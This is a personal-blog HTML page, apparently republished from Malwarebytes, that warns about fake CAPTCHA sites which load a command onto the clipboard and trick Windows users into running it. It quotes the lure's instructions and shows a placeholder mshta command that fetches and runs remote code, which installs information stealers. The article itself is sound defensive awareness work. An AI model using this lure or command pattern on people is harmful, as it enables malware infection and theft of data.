@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Fake CAPTCHA websites hijack your clipboard to install information stealers</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Fake CAPTCHA websites hijack your clipboard to install information stealers</h1>
+			<b><time>19.03.2025 00:00</time></b>
+		       
+
+			<div>
+				<p>There are more and more sites that use a clipboard hijacker and instruct victims on how to infect their own machine.</p>
+<p>I realize that may sound like something trivial to steer clear from, but apparently it’s not because the social engineering behind it is pretty sophisticated.</p>
+<p>At first, these attacks were more targeted at people that could provide cybercriminals a foothold at a targeted company, but their popularity has grown so much that now anyone can run into one of them.</p>
+<p>It usually starts on a website that promises visitors some kind of popular content: Movies, music, pictures, news articles, you name it.</p>
+<p>Nobody will think twice when they are asked to prove they are not a robot.</p>
+<p>
+<figure>
+  <img src="https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/Captcha.jpg" alt="content site asking to prove you&rsquo;re not a robot" />
+</figure>
+
+
+</p>
+<p>But the next step in this method isn’t what you would normally see. If you use the checkbox, you’ll be forwarded to something that looks like this:</p>
+<p>
+<figure>
+  <img src="https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/clipboard-hijacker.jpg" alt="instructions to infect yourself" />
+</figure>
+
+
+</p>
+<blockquote>
+<p>“To better prove you are not a robot, please:</p>
+<ol>
+<li>
+<p>Press &amp; hold the Windows Key + R.</p>
+</li>
+<li>
+<p>In the verification windows, press Ctrl + V.</p>
+</li>
+<li>
+<p>Press Enter on your keyboard to finish.</p>
+</li>
+</ol>
+<p>You will observe and agree:<br>
+“I’m not a robot – reCAPTCHA Verification ID: 8253”</p>
+<p>Perform the steps above to finish verification.”</p></blockquote>
+<p>While these instructions may seem harmless enough, if you follow the steps you will actually be infecting yourself with malware—most likely an information stealer. In the background, the website you visited copied a command to your clipboard. In Chromium based browsers (which are almost all the popular ones) a website can only write to your clipboard with your permission. But Windows was under the assumption that you agreed to that when you checked the checkbox in the first screen.</p>
+<p>What the obstructions in the prompt are telling you to do is:</p>
+<ol>
+<li>
+<p>Open the Run dialog box on Windows.</p>
+</li>
+<li>
+<p>Paste the content of your clipboard into that dialog box.</p>
+</li>
+<li>
+<p>Execute the command you just pasted.</p>
+</li>
+</ol>
+<p>They are not lying about what you will “observe”, but what they don’t tell you is that that’s only the last part of what you pasted, and what you are seeing is not really part of the command but just a comment added behind it.</p>
+<p>But under normal circumstances, this is what will be visible.</p>
+<!-- raw HTML omitted -->
+<p>
+<figure>
+  <img src="https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg" alt="last part of the pasted content in the Run dialog box" />
+</figure>
+
+
+</p>
+<!-- raw HTML omitted -->
+<p>You’ll only see the last part of the pasted content</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>The first part of what the target was instructed to paste are variations–sometimes obfuscated—of:</p>
+<pre tabindex="0"><code>mshta https://{malicious.domain}/media.file
+</code></pre><p>Mshta is a command that will trigger the legitimate Windows executable mshta.exe. But mshta will fetch the malicious media file from the specified domain and run it. The name of the media file may look perfectly fine. We have seen mp3, mp4, jpg, jpeg, swf, html, and there will be other possibilities.</p>
+<p>What the files are in reality is an encoded Powershell command which will run invisibly and download the actual payload. For a while, the malware we were seeing downloaded was almost exclusively the Lumma Stealer infostealer, but recently we’ve also found campaigns that use the same method to spread the SecTopRAT. Both of these are designed to steal sensitive data from your machine.</p>
+<h2 id="how-to-stay-safe">How to stay safe</h2>
+<p>There are a few things you can do to protect yourself from falling victim to these and similar methods:</p>
+<ul>
+<li>
+<p>Do not follow instructions provided by some website you visited without thinking it through.</p>
+</li>
+<li>
+<p>Use an active anti-malware solution that blocks malicious websites and scripts.</p>
+</li>
+<li>
+<p>Use a browser extension that blocks malicious domains and scams.</p>
+</li>
+<li>
+<p>Disable JavaScript in your browser before visiting unknown websites.</p>
+</li>
+</ul>
+<p>The clipboard access is triggered by a JavaScript function document.execCommand(‘copy’).  Disabling JavaScript will stop that from happening, but it has the disadvantage that it will break many websites that you visit regularly. What I do is use different browsers for different purposes.</p>
+<p>Here are step-by-step instructions on how to disable JavaScript in several popular browsers:</p>
+<h3 id="how-to-disable-javascript-in-chrome">How to disable JavaScript in <strong>Chrome</strong></h3>
+<ul>
+<li>
+<p>Open Chrome and click on the three-dot menu icon in the top right corner.</p>
+</li>
+<li>
+<p>Select <strong>Settings</strong> from the dropdown menu.</p>
+</li>
+<li>
+<p>On the left side, click on <strong>Privacy and security</strong>.</p>
+</li>
+<li>
+<p>Click on <strong>Site setting</strong>s.</p>
+</li>
+<li>
+<p>Scroll down to the <strong>Content</strong> section and click on <strong>JavaScript</strong>.</p>
+</li>
+</ul>
+<p>Toggle the switch to <strong>Don’t allow sites to use JavaScript</strong> to <strong>Disable JavaScript for all sites</strong>. You can also add specific sites to block or allow JavaScript by clicking on <strong>Add</strong> under the <strong>Block or Allow</strong> sections.</p>
+<h3 id="how-to-disable-javascript-in-firefox">How to disable JavaScript in Firefox</h3>
+<ul>
+<li>
+<p>Enter <strong>about:config</strong> into the search bar and select <strong>Accept the Risk and Continue</strong>.</p>
+</li>
+<li>
+<p>Enter <strong>javascript.enabled</strong> into the search box at the top of the page.</p>
+</li>
+<li>
+<p>Select the <strong>javascript.enabled</strong> toggle to change the value to <strong>false</strong>.</p>
+</li>
+</ul>
+<h3 id="how-to-disable-javascript-in-opera">How to disable JavaScript in Opera</h3>
+<ul>
+<li>
+<p>Launch Opera and click on the settings icon.</p>
+</li>
+<li>
+<p>Select <strong>Privacy &amp; Security</strong> from the options.</p>
+</li>
+<li>
+<p>Click on <strong>Site Settings</strong>.</p>
+</li>
+<li>
+<p>Select the <strong>JavaScript</strong> option.</p>
+</li>
+<li>
+<p>Choose <strong>Don’t allow sites to use JavaScript</strong> to disable JavaScript for all sites.</p>
+</li>
+</ul>
+<p>To disable JavaScript for specific sites, click <strong>Add</strong> under the <strong>Not allowed to use JavaScript</strong> section and enter the site’s URL.</p>
+<h3 id="how-to-disable-javascript-in-edge">How to disable JavaScript in Edge</h3>
+<ul>
+<li>
+<p>Open Microsoft Edge and click on the three-dot menu icon in the top right corner.</p>
+</li>
+<li>
+<p>Select <strong>Settings</strong> from the dropdown menu.</p>
+</li>
+<li>
+<p>In the left sidebar, click on <strong>Cookies</strong> and <strong>Site Permissions</strong>.</p>
+</li>
+<li>
+<p>Scroll down to the <strong>All Permissions</strong> section and select JavaScript.</p>
+</li>
+</ul>
+<p>Toggle the switch to disable JavaScript. You can also manage JavaScript settings for individual sites by adding them to the allow or block lists.</p>
+<hr>
+<p><strong>We don’t just report on threats—we remove them</strong></p>
+<p>Cybersecurity risks should never spread beyond a headline. Keep threats off your devices by downloading Malwarebytes today.</p>
+<p>Go to Source</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
